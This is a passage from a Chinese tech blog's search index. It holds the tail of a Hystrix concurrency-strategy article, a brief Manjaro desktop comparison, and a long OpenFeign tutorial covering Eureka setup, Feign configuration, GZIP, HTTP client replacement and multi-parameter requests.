commandExecutionHook = HystrixPlugins.getInstance().getCommandExecutionHook(); HystrixEventNotifier eventNotifier = HystrixPlugins.getInstance().getEventNotifier(); HystrixMetricsPublisher metricsPublisher = HystrixPlugins.getInstance().getMetricsPublisher(); HystrixPropertiesStrategy propertiesStrategy = HystrixPlugins.getInstance().getPropertiesStrategy(); HystrixPlugins.reset(); HystrixPlugins.getInstance().registerConcurrencyStrategy(this); HystrixPlugins.getInstance().registerCommandExecutionHook(commandExecutionHook); HystrixPlugins.getInstance().registerEventNotifier(eventNotifier); HystrixPlugins.getInstance().registerMetricsPublisher(metricsPublisher); HystrixPlugins.getInstance().registerPropertiesStrategy(propertiesStrategy); } catch (Exception e) { throw e; } } @Override public ThreadPoolExecutor getThreadPool(HystrixThreadPoolKey threadPoolKey, HystrixProperty&lt;Integer&gt; corePoolSize, HystrixProperty&lt;Integer&gt; maximumPoolSize, HystrixProperty&lt;Integer&gt; keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue) { return this.delegateHystrixConcurrencyStrategy.getThreadPool(threadPoolKey, corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue); } @Override public ThreadPoolExecutor getThreadPool(HystrixThreadPoolKey threadPoolKey, HystrixThreadPoolProperties threadPoolProperties) { return this.delegateHystrixConcurrencyStrategy.getThreadPool(threadPoolKey, threadPoolProperties); } @Override public BlockingQueue&lt;Runnable&gt; getBlockingQueue(int maxQueueSize) { return this.delegateHystrixConcurrencyStrategy.getBlockingQueue(maxQueueSize); } @Override public &lt;T&gt; HystrixRequestVariable&lt;T&gt; getRequestVariable(HystrixRequestVariableLifecycle&lt;T&gt; rv) { return this.delegateHystrixConcurrencyStrategy.getRequestVariable(rv); }} 补充内容Hystrix 的优势Hytrix 支持异步调用，支持线程池级别的隔离 这种方式就是通过 RxJava 进行调用，等待完成后进行异步通知调用，但在 HTTP 这种请求中，主线程还是阻塞在等待中。带来的收益无非就是 Hytrix 能对超时进行控制。但缺点也很明显，如果是每个接口创建一个线程池的话，如果接口过多，机器中会创建大量线程，而在 Java 中，线程是属于轻量级的进程，对应是内核线程，进而造成线程的切换。而线程切换的成本也比较高。再者还需要预先给各个资源做线程池大小的分配，并且对于一些使用了 ThreadLocal 的场景不友好。 Hytrix 支持百分比 + 连续错误比率的条件进行降级 这确实比 Sentinel 单纯的统计异常率，或异常数更精细，技术选型具体根据业务去取舍。正如阿里巴巴自己比较的，Sentinel 侧重于流控，而熔断的话 Hytrix 更灵活和专业的，虽然 Hystrix 已经停止开发了，但一般情况下用 Sentinel 代替 Hytrix 也足够了。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Manjaro 安装图解教程",url:"/posts/eadad846.html",text:'官方桌面环境比较 XFCE 资源占用少，稳定 GNOME 定制性差，资源占用中等 KDE 定制性高，资源占用多，运行比较卡 官方桌面环境图 社区桌面环境图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"manjaro"},{title:"OpenFeign 入门教程 - 基础篇",url:"/posts/906bddbc.html",text:'Spring Cloud OpenFeign 介绍Feign 概述在使用 Spring Cloud 开发微服务应用时，各个服务提供者都是以 HTTP 接口的形式对外提供服务，因此在服务消费者调用服务提供者时，底层通过 HTTP Client 的方式访问。此时可以使用 JDK 原生的 URLConnection、Apache 的 HTTP Client、Netty 的异步 HTTP Client 或者 Spring 的 RestTemplate 去实现服务间的调用。但是最方便、最优雅的方式是通过 Feign 进行服务间的调用。Feign 是由 Netflix 开发的一个声明式的 Web Service 客户端，它的出现使开发 Web Service 客户端变得很简单；Feign 同时也是一款声明式、模板化的 HTTP 客户端。更多介绍可参考：Feign 项目、Spring Cloud Feign 官方中文教程 Spring Cloud OpenFeign 概述Spring Cloud OpenFeign 对 Feign 进行了二次封装，使得在 Spring Cloud 中使用 Feign 的时候，可以做到使用 HTTP 请求访问远程服务，就像调用本地方法一样的，开发者完全感知不到这是在调用远程访问，更感知不到在访问 HTTP 请求。Spring Cloud OpenFeign 增强了 Feign 的功能，使 Feign 有限支持 Spring MVC 的注解，如 @RequestMapping 等。OpenFeign 的 @FeignClient 注解可以解析 Spring MVC 的 @RequestMapping 注解下的接口，并通过动态代理的方式产生实现类，在实现类中做负载均衡并调用其他服务，默认集成了 Ribbon 与 Hystrix。更多介绍可参考：Spring Cloud OpenFeign 项目 Spring Cloud OpenFeign 的特性 Feign 最新特性一览图 支持 Hystrix 和 它的 Fallback 支持 HTTP 请求的响应和压缩 支持 Ribbon 的负载均衡客户端 支持可插拔的 HTTP 编码器和解码器 可插拔的注解支持，包括 Feign 注解 和 JAX-RS 注解 Feign 与 Spring Cloud OpenFeign 的选择Spring Cloud F 及 F 版本以上与 Spring Boot 2.0 以上一般使用 OpenFeign，如果从框架结构上看，OpenFeign 就是 2019 年 Feign 停更后出现的版本，也可以说大多数新项目都用 OpenFeign，而 2018 年以前的项目一般使用 Feign，大概可以这样粗率地划分。 Spring Cloud OpenFeign 入门案例1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，点击下载完整的案例代码。由于篇幅有限，下文中若没特殊说明，Feign 一般指的就是 Spring Cloud OpenFeign。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 源服务工程为了测试 Feign 的 Web 服务客户端的功能，必须要有一个源服务（服务提供者），并且可以选择启动多个实例，在每个实例中需要有一个标识（例如端口）来识别每次的调用是到了不同的服务实例上。这里可以使用一份代码，采取改变端口号的方式启动多次，就能启动多个相同的服务实例。创建 Provider 的 Maven 工程后，由于需要将服务注册到 Eureka Server，工程下的 pom.xml 文件需要引入 spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableDiscoveryClient，将服务注册到 Eureka Server： 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider）、注册中心地址与端口号，后面启动多实例只需要修改这里的端口号即可： 12345678910111213server: port: 9090spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. 创建 Feign Client 工程创建 Feign Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-openfeign；若是使用旧版的 Spring Cloud，则改为引入 spring-cloud-starter-feign。另外由于需要从 Eureka Server 获取服务列表，即作为 Eureka 客户端，还需要引入 spring-cloud-starter-netflix-eureka-client。 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建启动主类，添加注解 @EnableFeignClients、@EnableDiscoveryClient 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class FeignApplication { public static void main(String[] args){ SpringApplication.run(FeignApplication.class, args); }} 创建服务接口类，用于调用 Provider 源服务： 123456@FeignClient(value = "PROVIDER")public interface ProviderClientService { @GetMapping("/provider/add") String add(@RequestParam("a") Integer a, @RequestParam("b") Integer b);} 创建用于测试的 Controller 类，因为需要创建一个 API 来供第三方调用 Provider 源服务的那个自定义 API： 1234567891011@RestControllerpublic class CalculateController { @Autowired private ProviderClientService clientService; @GetMapping("/add") public String add(Integer a, Integer b){ return clientService.add(a, b); }} 在 application.yml 文件中配置端口号、注册中心地址： 12345678910111213server: port: 8080spring: application: name: feign-clienteureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 6. 测试 启动 Eureka Server 后，更改 Provider 源服务的端口号为 9091 与 9092 后分别启动，浏览器访问 http://127.0.0.1:8090，查看 Eureka Server 的界面是否正常显示多个 Provider 源服务 启动 Feign Client 应用，浏览器访问 http://localhost:8080/add?a=3&amp;b=9，若正常返回计算结果，说明整个项目运行成功 提示：由于 Feign 默认集成了 Ribbon（客户端负载均衡），当存在多个服务提供者时，Feign 默认会使用轮询的方式访问源服务，此外 Feign 对服务实例节点的增减也能动态感知 Spring Cloud OpenFeign 基础功能Feign 的工作原理 开发微服务应用时，在主程序入口添加 @EnableFeignClients 注解开启对 Feign Client 扫描加载处理。根据 Feign Client 的开发规范，需要定义接口并添加 @FeignClient 注解。 当程序启动时，会进行包扫描，扫描所有标注了 @FeignClient 注解的类，并将这些信息注入 Spring IOC 容器中。 当定义的 Feign 接口中的方法被调用时，通过 JDK 的代理方式，来生成具体的 RequestTemplate。生成代理时，Feign 会为每个接口方法创建一个 RestTemplate 对象，该对象封装了 HTTP 请求需要的全部信息，如请求参数名、请求方法等信息都在这个过程中确定。 然后由 RestTemplate 生成 Request，接着把 Request 交给 Client 去处理，这里指的 Client 可以是 JDK 原生的 URLConnection、Apache 的 Http Client、也可以是 Okhttp。最后 Client 被封装到 LoadBalanceClient 类中，这个类结合 Ribbon 客户端负载均衡发起服务间的调用。 @FeignClient 注解的属性 name：指定 FeignClient 的名称，如果项目使用了 Ribbon，那么 name 属性会作为微服务的名称，用于服务发现 url：一般用于调试，可以手动指定 @FeignClient 调用的服务地址 decode404：当发生 404 错误时，如果该字段值为 true，会调用 decoder 进行解码，否则抛出 FeignException configuration：Feign 配置类，可以自定义 Feign 的 Encoder、Decoder、LogLevel、Contract fallback：定义容错的处理类，当调用远程接口失败或超时，会调用对应接口的容错逻辑，fallback 指定的类必须实现 @FeignClient 标记的接口 fallbackFactory：工厂类，用于生成 fallback 类示例，通过这个属性可以实现每个接口通用的容错逻辑，减少重复的代码 path：定义当前 FeignClient 的统一前缀 Feign 属性文件配置若希望对单个指定特定名称的 Feign 进行配置，此时可以将 @FeignClient 注解的属性配置写在 application.yml 或者 application.properties，配置示例如下： 12345678910111213141516feign: client: config: feignName: # 需要配置的FeignName connectTimeout: 5000 # 连接超时时间 readTimeout: 5000 # 读超时时间设置 loggerLevel: full # 配置Feign的日志级别 errorDecoder: com.example.SimpleErrorDecoder # Feign的错误解码器 retryer: com.example.SimpleRetryer # 配置重试 requestInterceptors: # 配置拦截器 - com.example.FooRequestInterceptor - com.example.BarRequestInterceptor decode404: false encoder: com.example.SimpleEncoder # Feign的编码器 decoder: com.example.SimpleDecoder # Feign的解码器 contract: com.example.SimpleContract # Feign的Contract配置 作用于所有 Feign 的配置方式，如果想使用 application.yml 或者 application.properties 来配置所有 Feign，可以使用下述配置： 1234567feign: client: config: default: readTimeout: 5000 loggerLevel: full connectTimeout: 5000 @EnableFeignClients 注解上有个 defaultConfiguration 属性，可以将默认配置统一写在一个配置类中，然后在主程序入口用 defaultConfiguration 来应用配置类，该配置方式同样可以作用于所有 Feign 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClients(defaultConfiguration = DefaultFeignConfiguration.class)public class FeignApplication { public static void main(String[] args){ SpringApplication.run(FeignApplication.class, args); }} 特别注意：如果通过 Java 代码的方式配置过 Feign，然后又通过 application.yml 或者 application.properties 属性文件的方式配置 Feign，默认情况下属性文件中 Feign 的配置会覆盖 Java 代码的配置。但是可以通过使用参数 feign.client.default-to-properties=false 来改变 Feign 配置生效的优先级。 Feign Client 开启日志Feign 为每一个 FeignClient 都提供了一个 feign.Logger 实例，可以在配置中开启日志，开启方式比较简单，分为两步。 第一步：在 application.yml 中配置日志输出，默认情况下，记录器的名称是用于创建 Feign 客户端的接口的完整类名，Feign 日志记录仅响应 DEBUG 级别 123logging: level: com.springcloud.study.service.ProviderClientService: debug 第二步：通过 Java 代码的方式配置日志 Bean，可以配置在主程序入口类或者带有 @Configuration 注解的类，作用是通过配置的 Logger.Level 对象告诉 Feign 记录哪些日志内容 1234567891011121314151617@Configurationpublic class FeignServiceConfig { /** * Logger.Level 的具体级别如下： * NONE：不记录任何信息 * BASIC：仅记录请求方法、URL以及响应状态码和执行时间 * HEADERS：除了记录 BASIC级别的信息外，还会记录请求和响应的头信息 * FULL：记录所有请求与响应的明细，包括头信息、请求体、元数据 * * @return */ @Bean Logger.Level feignLoggerLevel() { return Logger.Level.FULL; }} Feign 开启 GZIP 压缩Feign 支持对请求和响应进行 GZIP 压缩，以此提高通信效率，下述内容配置了 Consumer 通过 Feign 到 Provider 的请求与相应的 Gzip 压缩（在服务消费者端配置） 12345678feign: compression: request: enabled: true mime-types: text/xml,application/xml,application/json # 配置压缩支持的MIME TYPE min-request-size: 2048 # 配置压缩数据大小的下限 response: enabled: true # 配置响应GZIP压缩 由于开启 GZIP 压缩后，Feign 之间的调用是通过二进制协议进行传输的，若服务之间的调用结果出现了乱码，此时可以将返回值的类型修改为 ResponseEntity&lt;byte[]&gt;，其中的 Controller 类 与被 @FeignClient 注解标注的接口都要修改 123456@FeignClient(value = "PROVIDER")public interface ProviderClientService { @GetMapping("/provider/say") ResponseEntity&lt;byte[]&gt; String say(@RequestParam("msg") String msg);} 1234567891011@RestControllerpublic class CalculateController { @Autowired private ProviderClientService clientService; @GetMapping("/say") public ResponseEntity&lt;byte[]&gt; say(String msg){ return clientService.say(msg); }} 验证压缩效果，首先开启 Feign 的日志输出，然后分别启用 Feign 压缩与关闭 Feign 压缩，观察前后输出的日志信息： 关闭 GZIP 压缩的 Request 12---&gt; GET http://PROVIDER/provider/say?msg=hello HTTP/1.1---&gt; END HTTP (0-byte body) 开启 GZIP 压缩的 Request，增加了 Accept-Encoding: gzip，证明 Request 开启了 GZIP 压缩 1234---&gt; GET http://PROVIDER/provider/say?msg=hello HTTP/1.1Accept-Encoding: gzipAccept-Encoding: deflate---&gt; END HTTP (0-byte body) Feign 的超时设置Feign 的调用分为两层，即 Ribbon 的调用和 Hystrix 的调用；其中高版本的 Feign 默认关闭了 Hystrix，而 Ribbon 默认是启用了。首先根据超时的异常日志信息，判断是 Ribbon 超时 还是 Hystrix 超时导致了异常的发生，然后根据判断结果添加 Ribbon 或者 Hystrix 的超时配置信息即可。例如：下述配置内容是针对 provider 服务添加与 Ribbon 超时相关的配置参数： 1234PROVIDER: ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 Feign 使用注意事项 在 Feign Client 接口中，不支持 GET 方法直接绑定 POJO 等复杂对象 在 Feign Client 接口中，如果使用到 @PathVariable，必须指定其 value 在 Feign Client 接口中，不能使用 @GetMapping 之类的组合注解，只支持使用 @RequestMapping 这类基础注解 @FeignClient 的属性中，serviceId 属性已经失效，推荐使用 name 属性 @FeignClient 的属性中，在老版本的 Spring Cloud 使用 url 属性时，不需要提供 name 属性；但在新版本中里必须提供 name 属性，并且 name、url 属性支持占位符 若需要自定义单个 Feign Client 的配置，此时被 @Configuration 注解标注的类，不允许被 @ComponentScan 注解扫描到，否则将会导致所有的 Feign Client 都会使用该配置 Spring Cloud OpenFeign 实战应用Feign 默认 Client 的替换Feign 在默认情况下使用的是 JDK 原生的 URLConnection 发送 HTTP 请求，没有使用连接池，但是对每个地址都会保持一个长连接，即利用 HTTP 的 persistence connections。开发者可以用 Apache 的 HTTP Client 替换 Feign 原始的 HTTP Client，通过设置连接池、超时时间等对服务之间的调用进行调优。通过查看源码，在类 feign.Client.Default 中可以看到以下代码，默认执行 HTTP 请求的就是 URLConnection。而在类 org.springframework.cloud.openfeign.ribbon.FeignRibbonClientAutoConfiguration 中，可以看到引入了三个类：HttpClientFeignLoadBalancedConfiguration、OkHttpFeignLoadBalancedConfiguration、DefaultFeignLoadBalancedConfiguration，其中可以看到在 DefaultFeignLoadBalancedConfiguration 中，使用的是 feign.Client.Default，即使用了 URLConnection。 1234567public static class Default implements Client { public Response execute(Request request, Options options) throws IOException { HttpURLConnection connection = this.convertAndSend(request, options); return this.convertResponse(connection).toBuilder().request(request).build(); }} 12345678class DefaultFeignLoadBalancedConfiguration { @Bean @ConditionalOnMissingBean public Client feignClient(CachingSpringLoadBalancerFactory cachingFactory, SpringClientFactory clientFactory) { return new LoadBalancerFeignClient(new Default((SSLSocketFactory)null, (HostnameVerifier)null), cachingFactory, clientFactory); }} 使用 HTTP Client 替换替换步骤使用 Apache HTTP Client 替换 Feign 默认的 Client，替换步骤非常简单，只需要在 pom.xml 与 application.yml 分别添加以下配置内容即可： 1234567891011&lt;!-- 引入 HTTP Client --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- 引入 Feign 对 Http Client 的支持 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.netflix.feign&lt;/groupId&gt; &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt;&lt;/dependency&gt; 123feign: httpclient: enabled: true 常见错误引入 feign-httpclient 出现下述的错误信息。查看源码可知，这是由于 OpenFeign 调用的不是 com.netflix.feign 的 feign-core 包的代码，而是调用了自身的 feign-core 的代码，但自身的 feign-core 包中的 Response 类并没有 create() 方法导致的。 1Caused by: java.lang.NoSuchMethodError: feign.Response.create(ILjava/lang/String;Ljava/util/Map;Lfeign/Response$Body;)Lfeign/Response; 解决方法是改为引入 io.github.openfeign 的 feign-httpclient 包，配置内容如下： 1234567891011&lt;!-- 引入 HTTP Client --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- 引入 Feign 对 Http Client 的支持 --&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt; &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt;&lt;/dependency&gt; 验证替换在类 HttpClientFeignLoadBalancedConfiguration 上，声明了注解 @ConditionalOnClass(ApacheHttpClient.class)、@ConditionalOnProperty(value = "feign.httpclient.enabled", matchIfMissing = true)，即只有在 ApacheHttpClient 类存在且 feign.httpclient.enabled 为 true 时才会启用配置。此时可以在 HttpClientFeignLoadBalancedConfiguration.feignClient() 方法里打上断点（约第 43 行），重新启动项目（切记不要以单元测试的方式启动，否则可能会因缺少配置导致无法进入打断点的代码），可以看到确实进行了 ApacheHttpClient 的声明；再将 feign.httpclient.enabled 设置为 false 后，断点就进不来了，由此可以验证 ApacheHttpClient 替换成功。 使用 Okhttp 替换替换步骤使用 Okhttp 替换 Feign 默认的 Client，同样只需要在 pom.xml 与 application.yml 分别添加以下配置内容 12345&lt;!-- 引入 Feign 对 Okhttp 的支持 --&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt; &lt;artifactId&gt;feign-okhttp&lt;/artifactId&gt;&lt;/dependency&gt; 123feign: okhttp: enabled: true 参数配置若需要对 Okhttp 进行个性化的参数设置，可参考以下代码，其中 Okhttp 的特性有： 支持 SPDY，可以合并多个到同一个主机的请求 使用连接池技术减少请求的延迟（如果 SPDY 是可用的话） 使用 GZIP 压缩减少传输的数据量 缓存响应结果，避免重复的网络请求 1234567891011121314151617181920@Configuration@ConditionalOnClass(Feign.class)@AutoConfigureBefore(FeignAutoConfiguration.class)public class FeignOkHttpConfig { @Bean public okhttp3.OkHttpClient okHttpClient(){ return new okhttp3.OkHttpClient.Builder() //设置连接超时 .connectTimeout(60, TimeUnit.SECONDS) //设置读超时 .readTimeout(60, TimeUnit.SECONDS) //设置写超时 .writeTimeout(60,TimeUnit.SECONDS) //是否自动重连 .retryOnConnectionFailure(true) .connectionPool(new ConnectionPool()) //构建OkHttpClient对象 .build(); }} 验证替换在 OkHttpFeignLoadBalancedConfiguration.feignClient() 方法里打断点调试，然后正常启动项目（切记不要以单元测试的方式启动，否则可能会因缺少配置导致无法进入打断点的代码）。 Post 和 Get 的多参数传递多参数传递方案介绍在企业项目的开发过程中，使用 Feign 实现服务与服务之间的调用时，无法避免多参数的传递。众所周知，在 Web 开发中 Spring MVC 是支持 GET 方法直接绑定 POJO 的，但是 Feign 的实现并未覆盖所有 Spring MVC 的功能，目前解决方式很多，最常见的解决方式如下： 将方法参数封装成 Map 传递 通过 Feign 拦截器的方式处理（推荐） 将 POJO 拆散一个个单独的属性放在方法参数里 使用 GET 传递 @RequestBody，但此方式违反了 Restful 规范 多参数传递的示例代码这里主要介绍通过 Feign 拦截器处理的方式，通过实现 Feign 的 RequestInterceptor 中的 aplly 方法，来进行统一拦截转换处理 Feign 中的 GET 方法多参数传递的问题。由于篇幅有限，下面只贴出核心代码，完整的示例代码可以点击这里下载。 为了方便测试服务之间的接口调用，在 Consumer 端（服务消费者）整合 Swagger2， pom.xml 加入以下配置： 1234567891011&lt;!-- Swagger2 --&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; 在 Consumer 端（服务消费者）编写 Feign 拦截器代码，由于 Feign 不支持 GET 方法传 POJO，因此手动将 Json Body 转换为 Query： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455@Componentpublic class FeignRequestInterceptor implements RequestInterceptor { @Autowired private ObjectMapper objectMapper; @Override public void apply(RequestTemplate template) { // Feign 不支持 GET 方法传 POJO, 将 Json Body 转换为 Query if (template.method().equals("GET") &amp;&amp; template.body() != null) { try { JsonNode jsonNode = objectMapper.readTree(template.body()); template.body(null); Map&lt;String, Collection&lt;String&gt;&gt; queries = new HashMap&lt;&gt;(); buildQuery(jsonNode, "", queries); template.queries(queries); } catch (IOException e) { // 根据实践项目情况处理此处异常 e.printStackTrace(); } } } private void buildQuery(JsonNode jsonNode, String path, Map&lt;String, Collection&lt;String&gt;&gt; queries) { if (!jsonNode.isContainerNode()) { // 叶子节点 if (jsonNode.isNull()) { return; } Collection&lt;String&gt; values = queries.get(path); if (null == values) { values = new ArrayList&lt;&gt;(); queries.put(path, values); } values.add(jsonNode.asText()); return; } if (jsonNode.isArray()) { // 数组节点 Iterator&lt;JsonNode&gt; it = jsonNode.elements(); while (it.hasNext()) { buildQuery(it.next(), path, queries); } } else { Iterator&lt;Map.Entry&lt;String, JsonNode&gt;&gt; it = jsonNode.fields(); while (it.hasNext()) { Map.Entry&lt;String, JsonNode&gt; entry = it.next(); if (StringUtils.hasText(path)) { buildQuery(entry.getValue(), path + "." + entry.getKey(), queries); } else { // 根节点 buildQuery(entry.getValue(), entry.getKey(), queries); } } } }} 编写 Consumer 端（服务消费者）的 Feign Client 接口类： 1234567891011121314@FeignClient(name = "PROVIDER")public interface UserFeignService { /** * 默认情况下，Feign 不支持 GET 方法传 POJO * @param user * @return */ @RequestMapping(value = "/user/add", method = RequestMethod.GET) String addUser(User user); @RequestMapping(value = "/user/update", method = RequestMethod.POST) String updateUser(@RequestBody User user);} 使用 Swagger2，并编写 Consumer 端（服务消费者）的 Controller 类，用于调用 Feign Client 进行 GET 或者 POST 多参数传递 123456789101112131415161718192021222324252627282930@RestController@Api("用户管理相关接口")@RequestMapping("/user")public class UserController { @Autowired private UserFeignService userFeignService; /** * 用于演示Feign的Get请求多参数传递 * @param user * @return */ @ApiOperation("添加用户的接口") @RequestMapping(value = "/add", method = RequestMethod.GET) public String addUser(@ApiParam(name="用户",required=true) User user){ return userFeignService.addUser(user); } /** * 用于演示Feign的Post请求多参数传递 * @param user * @return */ @ApiOperation("更改用户的接口") @RequestMapping(value = "/update", method = RequestMethod.POST) public String updateUser( @RequestBody @ApiParam(name="用户",value="传入json格式",required=true) User user){ return userFeignService.updateUser(user); }} 编写 Provider 端（服务提供者）的 Controller 类，用于接收 Feign Client 的 GET 请求传递过来的 User 对象： 12345678910111213141516@RestController@RequestMapping("/user")public class UserController { @RequestMapping(value = "/add", method = RequestMethod.GET) public User addUser(User user) { System.out.println("==&gt; add: " + user.getId() + \'-\' + user.getName() + "-" + user.getAge()); return user; } @RequestMapping(value = "/update", method = RequestMethod.POST) public User updateUser(@RequestBody User user) { System.out.println("==&gt; update: " + user.getId() + \'-\' + user.getName() + "-" + user.getAge()); return user; }} 分别启动各个应用后，浏览器访问 http://127.0.0.1:8080/swagger-ui.html，通过 Swagger2 提供的 UI 界面测试对应的接口即可。 Feign 处理文件上传Netflix 开发的 Feign 早先不支持文件上传，后来虽支持但仍有缺陷，需要一次性完整地将文件读到内存再编码发送。在早期的 Spring Cloud 中，Feign 本身是没有文件上传功能的，要想实现文件上传功能，需要自行编写 Encoder 去实现文件上传。后来 Netflix 官方提供了子项目 feign-form，其中实现了文件上传所需的 Encoder。由于篇幅有限，下面只贴出核心代码，完整的示例代码可以点击这里下载。 在 Consumer 端（服务消费者）的 pom.mxl 文件添加以下内容： 1234567891011&lt;!-- Feign 文件上传--&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign.form&lt;/groupId&gt; &lt;artifactId&gt;feign-form&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign.form&lt;/groupId&gt; &lt;artifactId&gt;feign-form-spring&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt; 在 Consumer 端（服务消费者）中，指定 Feign Client 处理文件上传的编码器，特别注意：该配置类不能被 @ComponentScan 注解扫描到，否则该配置将应用到所有 Feign Client 1234567891011/** * Feign Client 配置（非全局生效） */@Configurationpublic class FeignMultipartSupportConfig { @Bean public Encoder 